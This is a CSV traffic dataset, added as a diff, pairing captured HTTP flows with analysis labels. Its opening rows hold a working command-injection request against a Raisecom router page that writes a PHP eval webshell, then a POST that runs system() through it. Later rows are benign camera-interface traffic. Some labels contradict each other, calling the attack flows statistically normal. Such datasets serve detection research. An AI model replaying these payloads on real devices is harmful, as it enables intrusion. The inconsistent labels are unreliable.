@@ -1,0 +1,1913 @@
+﻿src_ip,dst_ip,src_port,dst_port,u_avg_http_size,d_avg_http_size,u_var_http_size,d_var_http_size,u_avg_interval,d_avg_interval,u_var_interval,d_var_interval,stream_duration,request_count,response_count,status_codes,full_request,full_response,source_pcap,analysis_statistical_analysis,analysis_search_description,analysis_is_normal,analysis_request_analysis,analysis_response_analysis,analysis_rsearch_description,analysis_special_product,analysis_attack_type,analysis_cve_keywords,analysis_cwe_keywords,analysis_analysis_confidence,analysis_consolidated_analysis
+209.141.46.203,201.219.97.169,59722,80,418.0,1238.0,0.0,0.0,0.0,0.0,0.0,0.0,0.537255048751831,1,1,"[""{'200': 1}""]","GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+'%5Cx3c%5Cx3f%5Cx70%5Cx68%5Cx70%5Cx20%5Cx40%5Cx65%5Cx76%5Cx61%5Cx6c%5Cx28%5Cx24%5Cx5f%5Cx50%5Cx4f%5Cx53%5Cx54%5Cx5b%5Cx27%5Cx61%5Cx27%5Cx5d%5Cx29%5Cx3b%5Cx3f%5Cx3e'%3E/www/tmp/custom_language_en.php%60 HTTP/1.1
+Host: 201.219.97.169
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.0
+
+","HTTP/1.1 200 OK
+X-Powered-By: PHP/7.1.30
+Set-Cookie: PHPSESSID=rpk682vi8lv2c67vhc95b6dgig; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Cache-control: private
+Content-type: text/html; charset=UTF-8
+Content-Length: 932
+Date: Mon, 10 Jun 2024 07:27:52 GMT
+Server: Apache 1.3.29
+
+<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
+<html xmlns=""http://www.w3.org/1999/xhtml"">
+ 
+<head>
+<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"" />
+<title></title>
+<link href=""../css/list.css"" rel=""stylesheet"" type=""text/css"" />
+<link href=""../css/node_info.css"" rel=""stylesheet"" type=""text/css"" />
+<script src=""../js_script/function.js""></script>
+<script src=""../../js_script/ajax_function.js""></script>
+</head>
+<body>
+<script language=""javascript"">
+
+				var path =window.location.hostname;
+	
+				var path_arr = path.split(""/"");
+	
+				var page = path_arr[path_arr.length-1];
+	
+				if((page == ""main.php"")||(page == ""login.php""))
+	
+				{
+	
+					window.location =""/"";
+	
+				}
+	
+				else
+	
+				{
+	
+					window.parent.parent.location=""/"";
+	
+				}
+	
+				</script>sock_fd <=0 or rs_guish is null.....\n",raisecom1.pcap,"The traffic exhibits a 1:1 ratio between requests and responses, with stable packet sizes (low variance) and no time interval between packets, indicating a single, synchronous exchange. These characteristics align with typical normal behavior, especially for a single transaction scenario such as a standard HTTP request-response cycle. There are no signs of high frequency, abnormal packet sizes, or irregular timing that would suggest malicious activity.",无,False,"The request contains a suspicious parameter 'template' with encoded PHP code, which appears to be an attempt to inject malicious PHP code into the server. The use of encoded PHP code in a GET request is highly unusual and indicative of a potential command injection or remote code execution attack.","The response includes a 200 OK status code, which might indicate that the server processed the request. The presence of PHP in the 'X-Powered-By' header and the server header 'Apache 1.3.29' suggests the server is running outdated software, which could be vulnerable to known exploits. The response body contains JavaScript that redirects based on the page, but the presence of 'sock_fd <=0 or rs_guish is null.....' suggests an error or unexpected server behavior, possibly due to the malicious request.","[""Anomalous Payload Injection"", ""Potential Remote Code Execution""]","[""list_base_config.php""]",Potential Unknown Attack,Anomalous Payload Injection in list_base_config.php leading to Potential Remote Code Execution,The product processes input from an upstream component in a way that could allow for remote code execution due to insufficient validation or sanitization of the input.,0.75,"The presence of 'Anomalous Payload Injection' and 'Potential Remote Code Execution' in the request and response features, along with the specific file 'list_base_config.php', suggests a potential unknown attack. This combination indicates an attempt to exploit a vulnerability that could allow for remote code execution, possibly due to insufficient input validation or sanitization in the handling of 'list_base_config.php'. The lack of statistical features does not detract from the severity of the observed anomalies, hence the moderate confidence level."
+209.141.46.203,201.219.97.169,59804,80,347.3333333333333,165.66666666666666,382.3333333333333,8.333333333333334,2.888653039932251,2.8879860639572144,8.71940486061078,8.72016454379289,6.039997100830078,3,3,"[""{'200': 3}""]","POST /tmp/custom_language_en.php HTTP/1.1
+Host: 201.219.97.169
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.0
+Content-Length: 86
+Content-Type: application/x-www-form-urlencoded
+
+a=system%28%27echo+BRcQmcNyQxvP+%3E+%2Fwww%2Ftmp%2Finfo.html+%26%26+echo+eNcE%27%29%3B","HTTP/1.1 200 OK
+X-Powered-By: PHP/7.1.30
+Content-type: text/html; charset=UTF-8
+Content-Length: 5
+Date: Mon, 10 Jun 2024 07:27:55 GMT
+Server: Apache 1.3.29
+
+eNcE
+",raisecom1.pcap,"The traffic exhibits a balanced request and response count (3:3), indicating a normal interaction pattern. The variance in uplink packet size is high (382.3 bytes), which could suggest some anomalies, but the downlink packet size is stable (8.3 bytes variance). The time intervals for both uplink and downlink are identical and show a high variance (8.72 s), which might indicate sporadic communication but not necessarily malicious. Given the balanced request-response ratio and the absence of extreme values in packet sizes or intervals, this traffic is likely normal. The high variance in uplink packet size could be due to legitimate variations in data being sent, such as different types of requests or data payloads.",无,False,请求分析显示，该请求尝试通过POST方法向/tmp/custom_language_en.php路径发送数据，数据中包含疑似命令注入的代码（system('echo BRcQmcNyQxvP > /www/tmp/info.html && echo eNcE')）。这种行为不符合正常用户的操作模式，且User-Agent显示为python-requests/2.18.0，可能是自动化工具发起的攻击。,"响应分析显示，服务器返回了状态码200 OK，响应体为'eNcE'，这与请求中注入的命令输出一致，表明命令注入成功执行。此外，响应头中暴露了服务器信息（PHP/7.1.30, Apache 1.3.29），这进一步证实了攻击的有效性。","[""Command Injection"", ""Anomalous Payload Injection""]",[],Potential Unknown Attack,Command Injection via Anomalous Payload,"The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.",0.8,"The traffic exhibits signs of command injection through anomalous payload injection, which does not match any known CVE but shows characteristics of a potential unknown attack. The absence of statistical features does not diminish the significance of the content features indicating malicious intent."
+209.141.46.203,201.219.97.169,59980,80,394.0,19558.0,0.0,0.0,0.0,0.0163339376449584,0.0,0.0035508437931005,0.4797070026397705,1,1,"[""{'200': 1}""]","GET /tmp/wifical-8 HTTP/1.1
+Host: 201.219.97.169
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
+Cookie: PHPSESSID=8v2rfpih999nhmh5fkq19ijtu9
+
+","HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Accept-Ranges: bytes
+ETag: ""2509425490""
+Last-Modified: Tue, 26 Jul 2022 07:16:11 GMT
+Content-Length: 19328
+Date: Mon, 10 Jun 2024 07:27:59 GMT
+Server: Apache 1.3.29
+
+ELF	@4Gp4 (44@4@44@4@pHH@H@@@AAAAAAA@l``@`@XXQtd/lib/ld-uClibc.so.0A&3=GQ[et@;@@L@@
+UpAAAAppp@
+pp&p!p%&!$""% 
+	#@8@,8@@7DBA;@
+0 AAAAPpBA>DBA7@@!@$@@)	@5@LJDBA@;@;@;@C -"";@"";@W;@cp;@`;@\P;@@;@|0;@ ;@u;@;@:@:@:@:@_fini__uClibc_main__deregister_frame_info__register_frame_info_Jv_RegisterClassesputssystemservice_init_doneunlinkmemsetsnprintfopenreadclosevty_print_stdmemory_initios_get_board_idgetopt_longatoiexitlibsqlite3.so_DYNAMIC_LINKING__RLD_MAPlibzebra.solibsys.solibapi.solibcustom.solibobj.solibeth.solibdns.solibsal.solibhal.solibios_util.solibncurses.so.5librt.so.0libdl.so.0libcrypto.so.1.0.0libssl.so.1.0.0libcrypt.so.0libm.so.0libpthread.so.0__make_dpmemcpy__thenan_df__lshrdi3__pack_d__make_fplibc.so.0_ftext_fdata_edata__bss_start_fbss_end<'!'B<'$,
+9'TB<'$p:9'\ '!B<'!'$$' t	 'A<PBB<',($ @A<A<AR&As&#rs&xA<TB""!RY	 TB""+S`B$@@<	 A$$PB,($ 0'B<'|'@|@<A<A$	 XB$A<A@x A$  ' ''!B<'@<`<D$!@	 @<<D$!@	 ! ''!B<' $ $	b $b $b@<<D$!@	 @<=D$!@	 4 $b $b@<$=D$!@	 @<=D$!@	 @<H=D$!@	 4 $b $&b$@@<<D$!@	 @<=D$!@	 4$$b@<\=D$!@	 @<H=D$!@	 @<=D$!@	 @<=D$!@	  $b $b@<=D$!@	 @<=D$!@	 @<=D$!@	 ! '',(!B<' 04('$! `!(!0@!@	  4'@('$! `!(!0@!@	  @<=B$$@<0>c$('! `$!0@@<>G$!@	  ('! @!@	  4$Lb('$! `!(!0@!@	  @<=B$$<@<0>c$('! `$!0@@<8>G$!@	  ('! @!@	  ('$! `!(!0@!@	  @<=B$4<c4@<0>c$('! `$!0@@<d>G$!@	  ('! @!@	  !,(0'',(!B<' 04('$! `!(!0@!@	  4'@('$! `!(!0@!@	  @<=B$$@<0>c$('! `$!0@@<>G$!@	  ('! @!@	  4$Lb('$! `!(!0@!@	  @<=B$$<@<0>c$('! `$!0@@<>G$!@	  ('! @!@	  ('$! `!(!0@!@	  @<=B$4<c4@<0>c$('! `$!0@@<d>G$!@	  ('! @!@	  !,(0''! $ $b $b $e $b $b $b $	b $b $b $! ''<8!B<' @D0$(,4'$! `!(!0@!@	  4'$! `!(!0@!@	  @<>B$! @@D!@	  D@@<>B$4'$@<0>$! `$!0@@< ?G$!@	  4'! @!@	  @< ?D$!(p!@	  ((A@<8?D$!@	  4'(!(@$!@	  ,(!@	  ,J@,$Fb0'4'cC0u$b0v$
+b@<`?D$!@	  m4'!@$! `!(!0@!@	  @<?B$4'@<>$! `$!0@@< ?G$!@	  4'! @!@	  @<?D$!@	  @< ?D$!@	  4'!@$! `!(!0@!@	  @<>B$4'4$@<0>$! `$!0@@<?G$!@	  4'! @!@	  @<?D$!(p!@	  ((A@<?D$!@	  (!@	  @<?D$!@	  @<?D$!@	  D$b@<>B$4'$<@<0>$! `$!0@@< ?G$!@	  4'! @!@	  @< ?D$!(p!@	  ((A@<8?D$!@	  4'(!(@$!@	  ,(!@	  ,J@,$Fb0'4'cC0cv$b0v$
+b@<`?D$!@	  J4'!@$! `!(!0@!@	  @<?B$4'@<8>$! `$!0@@< ?G$!@	  4'! @!@	  @<?D$!@	  @< ?D$!@	  4'!@$! `!(!0@!@	  @<>B$4'4<4@<0>$! `$!0@@<?G$!@	  4'! @!@	  @<?D$!(p!@	  ((A@<?D$!@	  (!@	  @<@D$!@	  @<?D$!@	  !<8@''<8!B<' @D0$(,4'$! `!(!0@!@	  4'$! `!(!0@!@	  @<>B$! @@D!@	  D@@<>B$4'$@<0>$! `$!0@@< ?G$!@	  4'! @!@	  @< ?D$!(p!@	  ((A@<8?D$!@	  4'(!(@$!@	  ,(!@	  ,@,$b0'4'cC@<l@C$0! `!(@!@	  0u$b0v$
+b@<`?D$!@	  _4'!@$! `!(!0@!@	  @<?B$4'@<>$! `$!0@@< ?G$!@	  4'! @!@	  @<|@D$!@	  @< ?D$!@	  D$b@<>B$4'$<@<0>$! `$!0@@< ?G$!@	  4'! @!@	  @< ?D$!(p!@	  ((A@<8?D$!@	  4'(!(@$!@	  ,(!@	  ,J@,$Fb0'4'cC0cv$b0v$
+b@<`?D$!@	  4'!@$! `!(!0@!@	  @<?B$4'@<>$! `$!0@@< ?G$!@	  4'! @!@	  @<|@D$!@	  @< ?D$!@	  !<8@''!B<' $@<@B$! @ !@	  $b $b $: $b $b $b $	b $b $b $! ''40!B<'8<$ $(!@	 l!@	 $@<@B$! @$!@	 8<@<@F$A<0AG$!@	 ((S@(h$CiC(`d$Cr$-Cw$C<B$B! @!@	  $ <B$B! @!@	  $ <B$B! @!@	  $ a! !@	 ! $#f`\b#(! (( %(E!!<'!' $(@F@G$!	 !@,@F@G! 	 !( !(`0	 ! @<!C0! 	 !( $ ('E,<B4%b5$$0E$/E!(/`!(@P($#(E(!$ ($$C+%DD0@$T?B$D0@C$d@<+(E8@d0@$T?c$d0@b$DbB$$$!!b||||=|'`@T$$$@<@$+ CT$
+dTc$@T<$$Cc,$@<%C<'!4'< $'	  '0$(,8	 <@'|U|7% C$$&%$<+0d7@%@$$$% C<$$ ,$&%<%C<0'!'C,0,(D@<84$ !!`!d,$	DbDc&b<Cd$dCD! !(`	 $b$bBDP!uhi#'&#@*;@@! !( 	 !0$!(D!0!@	 !`D$B,#b$ $q% + %!'&@Pb@! !( 	 !0$!(D!0!@	 !`D$B,#b$ $i% + !%@	!H*u@P!`!!!@!Hb2CPB@P##+# )+# 1#@$@U#D#+ U#DC<B	g$@BB@(%(B$EBBED$+@$!0+@QCT','	C!+ P!)!UBCC <$+ dBBD0/B%%BBBCB$B!@!D!`@<840,($ H'<'!H't $ '	 X''H	 @'@'('$P'9'	 X'L	 ! @tx'<('!H't $ '	 X''H	 @'D@'$B8('X'P'9'	 DL	 ! @tx'<'!H't $ '	 X''H	 @'Xb,@@D,TD$
+d$C<\D&b+\
+D$$b<D\&b+D\fD& + \~X'Fh& + Dw@'PTl (-qX+0c	Pk!0+B@T$!0!8!0$!@@q+`e
+!(+ D`$+(!(!0!8!(`	q !0+@(!(! `H!(\!0D$&8+8, << O_BPBH%j%OB % $B($+H 0<+@G@(@ i(%(4 	@PO@@!@%($00$T$0
+T$%C@$$+D$$ !(e$8<(('L	 tx'<'!H'\ $ '	 @''H	 ('@b,e@@'(E,a('D,& D$d$e<&b@'S D!!PTKHEHG@0T<#bH+P`8=	$+	`! @8B$@0%8gH=	$! <!!+X`BX%Xe+X`BX%Xe%`D!`#X!#8+`#8!0`BXoB`!(`@8_)%% @0 %8gI0$%UPE0
+TP%0PPE$+ $$!PT@'L	 \`'f,E$,A$	g#D$dT$g/!$$
+d	fT$*@Q*0$T$+(T$D+(D+(+(D$	$T$+0P!$$
+!<P'!H'\ $ '	 @''H	 ('@c,`$(c,`P@'	 ('\`'<'!H'\ $ '	 @''H	 ('@c,`$(c,`P@'	 ('\`'<0'!H'\ $ '	 @''H	 ('@c,`$(c,`P@'	 ('\`'<'!H'\ $ '	 @''H	 ('@c,`$(c,`P@'	 ('\`'<'!'$40$<$@ <#  p&(
+,D	 !(($#P, L	 '4$!@c408'<P'!H''<	  ' $d!d,$dP$(`<b(@@$@P<<04<$	 #0$#dB4<@'<'!'HLL4 (,	 '48'<@'!H'<'	  '04%CC4 $(T|g	 !8@<@'<'!'4D@<8!$&$ p&&<$ (,D#$!(	 !0@S$$p@! !(	 !0@+%b	D	 !(($#Q, L	 'D@<84H'! $#f`\ #! E(e%!(!<'!X', $	 ',0'<@'!'0<84,($ C,`<B4%""$!@_$$YC$UC%X@!*1@*$#T9*!@!@! !( 	 !0$!(D!0!@	 !`D$B,#b$ $q% + %!C2$bB&B2@P<B&+R!s!@!`<+t.%P$@2$b&2@P <&+P!q!@!` <+""@'&BB%!@&&%!@!$!!!""~~<~! @!!840,($ @''A< $A&$	 &1$ ('!x	 %$!x	 $$!x	 #$!x	 ""$!x	 !$!x	  $!x	 $!x	 $!x	 $!x	 $!x	 $!x	 $!x	 $!x	 $!x	 $!x	 $!x	 $!x	 $<'!'B<'$p	9'R 'helpdaemonwriteread
+usage:
+wifical [-r <0/1>] [-w <0/1>]
+options:
+ -r = read cal data from flash to bin
+ -w = write cal data to flash
+  0 = 2.4G
+  1 = 5Ginsmod /lib/modules/mt7603eap.koifconfig ath0 upinsmod /lib/modules/mt7615_ap.koifconfig athfs0 upinsmod /lib/modules/mt7663_ap.koWIFI-2.4GWIFI-5Gpidof RtmpMlmeTask > /tmp/threadID.txtsh /etc/Wireless/taskset.sh/tmp/threadID.txt/userfs/bin/mtd writeflash %s %lu %lu %s/etc/RT30xxEEPROML.binopt0/etc/Wireless/RT2860AP_AC/RT30xxEEPROML.bin/etc/Wireless/RT2860AP_AC/CALDATA_default.bin/etc/RT30xxEEPROMV.bin/etc/Wireless/RT2860AP_AC/RT30xxEEPROMV.biniBoardID = 0x%x, iBand = %d
+/userfs/bin/mtd readflash %s %lu %lu %s/tmp/RT30xxEEPROM.binopen tmp/RT30xxEEPROM.bin failed !!!use default RT30xxEEPROM.bincat %s > %suse flash data/tmp/CALDATA_default.binopen /tmp/CALDATA_default.bin failed !!!cat /tmp/CALDATA_default.bin > /etc/CALDATA_default.bincat /tmp/CALDATA_default.bin > /etc/Wireless/RT2860AP_AC/CALDATA_default.binusid = 0x%x
+use flash data
+iBoardID = 0x%x, read flash to bin
+[main]iBoardID = 0x%x
+hd:w:r:A@<@hH<@dP<@wX<@r!@@;@@P3@X+@05@0%@5@@@7@0#@`&@@8@1@8@ $@;@;@;@;@;@;@p;@`;@P;@@;@0;@ ;@;@;@:@:@:@:@	@@ ;@ 
+@ @ @0@0@ @@@@@ !@80#@p#@( $@0%@%@@`&@P'@H*@xX+@x+@x.@`1@02@`2@`P3@`3@`p4@805@@5@8@6@@6@H7@8@0@8@@Agnu.shstrtab.interp.reginfo.dynamic.hash.dynsym.dynstr.init.text.MIPS.stubs.fini.rodata.eh_frame.ctors.dtors.jcr.data.rld_map.got.sdata.bss.pdr.gnu.attributes.mdebug.abi324@4pH@H`@`X%@4+@`3L@LU;@lA	@	1G:@:0S;@;LY@<@@<aA@AkAAArAAAyAAA~ AA A`AAAAAA@BA@BPBADB DBoFFF",raisecom1.pcap,"The traffic exhibits a 1:1 ratio between requests and responses, which is typical for normal behavior. The packet sizes, while significantly different between upstream (394.0 bytes) and downstream (19558.0 bytes), show no variance (±0.0), indicating stable data transmission without anomalies. The time intervals are also consistent, with upstream being instantaneous (0.00±0.00 s) and downstream having a minimal delay (0.02±0.00 s). These characteristics suggest a standard, non-malicious interaction, possibly a single HTTP request and response where the server returns a large amount of data (e.g., a file download or a webpage with rich content). There are no signs of high-frequency requests, abnormal packet size variations, or mismatched request/response counts that would indicate malicious activity.",无,False,"The request is directed to '/tmp/wifical-8' which is an unusual path for a standard web service, suggesting potential malicious intent. The use of a direct IP address instead of a domain name further increases suspicion. The User-Agent is spoofed to mimic Firefox, which is a common tactic in malicious requests to evade detection.","The response contains binary data (ELF header) and references to various libraries and system calls (e.g., 'system', 'unlink', 'open', 'read', 'close'), which is highly unusual for a standard HTTP response. This suggests the server may be returning executable code or sensitive system information, indicative of a potential command injection or information disclosure vulnerability. The presence of '/lib/ld-uClibc.so.0' and references to '/etc/Wireless' and '/tmp' paths further suggest this is related to an IoT device's firmware or configuration files.","[""Anomalous Payload Injection"", ""Potential Command Injection"", ""Information Disclosure""]","[""/tmp/wifical-8"", ""/lib/ld-uClibc.so.0"", ""/etc/Wireless/RT2860AP_AC/RT30xxEEPROML.bin"", ""/etc/Wireless/RT2860AP_AC/CALDATA_default.bin"", ""/etc/RT30xxEEPROMV.bin""]",Potential Unknown Attack,Anomalous payload injection and potential command injection in IoT device paths leading to information disclosure.,"The product processes input from an upstream component in a way that allows for the injection of anomalous payloads or commands, potentially leading to unauthorized access or information disclosure due to insufficient input validation.",0.75,"The presence of anomalous payload injection and potential command injection in the request and response features, combined with specific IoT device paths, suggests a potential unknown attack targeting IoT devices. The paths and files mentioned are indicative of attempts to exploit vulnerabilities in wireless configurations and system libraries, which could lead to information disclosure or further exploitation. The lack of statistical features does not diminish the potential threat, as the content and special product features strongly suggest malicious intent."
+209.141.46.203,5.2.202.19,52606,80,381.0,2066.0,0.0,0.0,0.0,5.960464477539063e-06,0.0,0.0,0.1674709320068359,1,1,"[""{'200': 1}""]","GET / HTTP/1.1
+Host: 5.2.202.19
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1
+
+","HTTP/1.1 200 OK
+Content-type: text/html
+Content-Length: 1981
+Connection: close
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"">
+    <title></title>
+    <link rel=""shortcut icon"" type=""image/x-icon"" href=""favicon.ico"" media=""screen"" />
+</head>
+<body>
+    <div class=""loadingIndicator_bk"">
+    </div>
+    <div class=""loadingIndicator_tip"">
+        <div style=""height: 300px;"">
+        </div>
+        <span class=""msg_border""><span class=""msg""></span></span>
+    </div>
+    <div id=""InitialView"" style=""background: #fff center url(css/Pictures/initview.gif) no-repeat; width: 100%; height: 100%;""></div>
+    <div id=""BaseContent"">
+    </div>
+    <!---->
+    <div id=""topFloatMsg"">
+        <div id=""topFloatMsg_title"">
+        </div>
+        <div id=""topFloatMsg_body"">
+            <div id=""topFloatMsg_icon"">
+            </div>
+            <div id=""topFloatMsg_content"">
+            </div>
+        </div>
+        <div id=""topFloatMsg_bottom"">
+        </div>
+    </div>
+    <iframe id=""topFloatMsg_bk"" scrolling=""no"" frameborder=""0"" src=""about:blank""></iframe>
+    <!---->
+    <div id=""topRollMsg"">
+        <div id=""topRollMsg_title"">
+            <span lc=""html"" lk=""IDCS_INFO_TIP""></span>
+            <div id=""topRollMsg_close"">
+            </div>
+        </div>
+        <div id=""topRollMsg_content"">
+        </div>
+    </div>
+    <iframe id=""topRollMsg_bk"" width=""100%"" height=""100%"" scrolling=""no"" frameborder=""0""
+        src=""about:blank""></iframe>
+    <script language=""javascript"" for=""VideoPlugin"" event=""NotifyResultToJs(strXMLFormat, lStrLen)"">
+        VideoPluginNotify(strXMLFormat, lStrLen);
+    </script>
+    <script language=""javascript"" for=""TimeSliderPlugin"" event=""NotifyResultToJs(strXMLFormat, lStrLen)"">
+        TimeSliderPluginNotify(strXMLFormat, lStrLen);
+    </script>
+    <script data-main=""js/index.js?v=20180615.01"" src=""js/lib/require.js"" type=""text/javascript""></script>
+</body>
+</html>
+",tvt_queryDevInfo2.pcap,"The traffic exhibits a 1:1 ratio between requests and responses, which is typical for normal traffic. The packet sizes are stable with no variance, and the time intervals are uniform with no bursts, indicating a consistent and low-frequency interaction. These characteristics align with standard protocol behaviors, such as a single HTTP request and response, suggesting the traffic is likely normal. There are no signs of high request rates, abnormal packet sizes, or irregular intervals that would indicate malicious activity.",无,True,请求符合标准HTTP规范，无异常参数或行为。User-Agent显示为iPhone的Safari浏览器，无伪造迹象。请求的路径为根路径'/'，与Host头部'5.2.202.19'相符，属于正常访问。,响应状态码为200 OK，内容类型为text/html，返回的是一个HTML页面，无敏感信息泄露或异常行为。页面内容显示为一个加载指示器，无恶意重定向或异常脚本。,"[""无""]",[],Normal Traffic,,,1.0,"The traffic shows no anomalies in statistical features, request and response characteristics, and does not involve any specific files or device types. Therefore, it is classified as normal traffic with high confidence."
+209.141.46.203,5.2.202.19,52614,80,413.0,89.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2364938259124755,1,1,"[""{'404': 1}""]","GET /Scripts/base.js?v=%7BJS_CSS_V%7D HTTP/1.1
+Host: 5.2.202.19
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1
+
+","HTTP/1.1 404 Not Found
+Content-type: text/html
+Content-Length: 0
+Connection: close
+
+",tvt_queryDevInfo2.pcap,"The traffic exhibits a 1:1 ratio between requests and responses, with stable packet sizes (low variance) and no time interval between packets, indicating a single, isolated interaction. The packet sizes are consistent and do not show anomalies typical of malicious activities such as injection attacks or data exfiltration. Given these characteristics, the traffic is likely normal, representing a standard, singular protocol interaction without signs of malicious intent or anomalies.",无,True,请求符合标准HTTP规范，无可疑参数或异常行为。User-Agent显示为iPhone浏览器，属于正常用户访问。请求的路径/Scripts/base.js?v=%7BJS_CSS_V%7D看起来是一个正常的JavaScript文件请求，尽管使用了IP地址而非域名作为Host，但这并不直接表明恶意行为。,响应返回了404 Not Found状态码，表示请求的资源不存在。这可能是由于服务器上确实没有该文件，或者是配置错误。没有敏感信息泄露或异常行为。,"[""无""]",[],Normal Traffic,,,1.0,"The traffic shows no anomalies in statistical features, request and response characteristics, and does not involve any specific files or device types. Therefore, it is classified as normal traffic with high confidence."
+209.141.46.203,5.2.202.19,52620,80,392.0,13680.0,0.0,0.0,0.0,7.97642601860894e-05,0.0,4.824902235769614e-08,0.223809003829956,1,1,"[""{'200': 1}""]","GET /js/index.js HTTP/1.1
+Host: 5.2.202.19
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+Connection: keep-alive
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1
+
+","HTTP/1.1 200 OK
+Content-type: 
+Content-Length: 13603
+Connection: close
+
+//
+var APP_TYPE = ""STANDARD"";//P2P,STANDARD
+var RES_V = ""20180615.01"";//HTMLJSCSS
+var dataServiceBase = ""/"";//API
+var serverIp = window.location.hostname;//IP
+var isFirstLoadStream = true;//UI1-D
+
+
+//ie8ipv6ip
+if(serverIp.indexOf(""["")!=-1){
+    serverIp=serverIp.substring(1,serverIp.length-1);
+}
+
+var webBase = ""/"";//
+var xmlHeader = ""<?xml version=\""1.0\"" encoding=\""utf-8\"" ?>"";
+var protocolVer = ""1.0"", systemType = ""NVMS-9000"";
+var osType, browser;
+var heightFix = 52; //config_content
+var nameByteMaxLen = 256; //;
+var pwdByteMaxLen = 16; //;
+var pluginPort = 0;
+var calendarListMap = {
+    ""fa-ir"": [
+        {value: ""Gregorian"", text: ""IDCS_GREGORIAN_CALENDAR""}
+        , {value: ""Persian"", text: ""IDCS_PERSIAN_CANENDAR"", isDefault: true}
+    ]
+};
+var systemAuthList = [""localChlMgr"", ""remoteChlMgr"", ""remoteLogin"", ""diskMgr"", ""talk"", ""alarmMgr"",
+    ""net"", ""scheduleMgr"", ""rec"", ""localSysCfgAndMaintain"", ""remoteSysCfgAndMaintain"", ""securityMgr""]; // 
+
+//
+var nodeExist = 536870913; //0x20000000+0x01 // ip 
+var resourceNotExist = 536870923; //0x20000000+0x0B // 
+var nameExist = 536870970; //0x20000000+0x3a // 
+var ipError = 536870992; //0x20000000+0x50 // IP
+var outOfRange = 536871004; //0x20000000+0x5C // 
+var noConfigData = 536870962; //
+
+require.config(
+    {
+        baseUrl: 'js/lib/',
+        paths: {
+            'jquery': 'jquery-1.8.3.min',
+            'cookieLib': 'jquery.cookie',
+            'webSessionLib': 'webSession',
+            'watermark': 'jquery.watermark.min',
+            'sparkMD5': 'spark-md5',
+            'datePicker': 'DatePicker/wbDatePicker',
+            'dialog': 'Dialog/wbDialog',
+            'grid': 'Grid/wbGrid',
+            'ipinput': 'IpInput/ipinput',
+            'macinput': 'MacInput/macInput',
+            'listbox': 'Listbox/listbox',
+            'loading': 'Loading/wbLoading',
+            'pager': 'Pager/wbPager',
+            'selectinput': 'SelectInput/selectinput',
+            'slider': 'Slider/slider',
+            'spliter': 'Spliter/spliter',
+            'tab': 'Tab/tab',
+            'timeBar': 'TimeBar/wbTimeBar',
+            'timeinput': 'TimeInput/timeinput',
+            'timeline': 'TimeLine/timeline',
+            'timeSpan': 'TimeSpan/TimeSpan',
+            'app': ""../app/""
+        },
+        urlArgs: ""v="" + RES_V,
+        waitSeconds: 0,
+        shim: {
+            'cookieLib': {
+                deps: ['jquery']
+            },
+            'webSessionLib': {
+                deps: ['jquery']
+            },
+            'watermark': {
+                deps: ['jquery']
+            },
+            'datePicker': {
+                deps: ['jquery', 'widget.base']
+            },
+            'grid': {
+                deps: ['jquery', 'widget.base']
+            },
+            'ipinput': {
+                deps: ['jquery']
+            },
+            'macinput': {
+                deps: ['jquery']
+            },
+            'listbox': {
+                deps: ['jquery']
+            },
+            'pager': {
+                deps: ['jquery', 'widget.base']
+            },
+            'selectinput': {
+                deps: ['jquery']
+            },
+            'slider': {
+                deps: ['jquery']
+            },
+            'spliter': {
+                deps: ['jquery']
+            },
+            'tab': {
+                deps: ['jquery']
+            },
+            'timeBar': {
+                deps: ['jquery', 'widget.base']
+            },
+            'timeinput': {
+                deps: ['jquery']
+            },
+            'timeline': {
+                deps: ['jquery', 'widget.base']
+            },
+            'timeSpan': {
+                deps: ['jquery', 'widget.base']
+            }
+        }
+    }
+);
+
+
+require(['require', 'jquery', 'CharsetHelper', 'LangCtrl', 'widget.base', 'Route', 'Plugin', 'CssLoader', 'cookieLib','webSessionLib', 'app/appInfo'],
+    function () {
+        osType = WidgetBase.DetectOS();
+        browser = WidgetBase.DetectBrowserInfo();
+        LangCtrl.SetDefaultLangType(function () {
+            if (APP_TYPE == ""STANDARD"") {
+                LoadApp();
+            }
+            else {
+                require([""/n9/siteDictionary.js""], function () {
+                    //
+                    if (Plugin.GetVideoPlugin()) {
+                        LoadApp()
+                    }
+                    else {
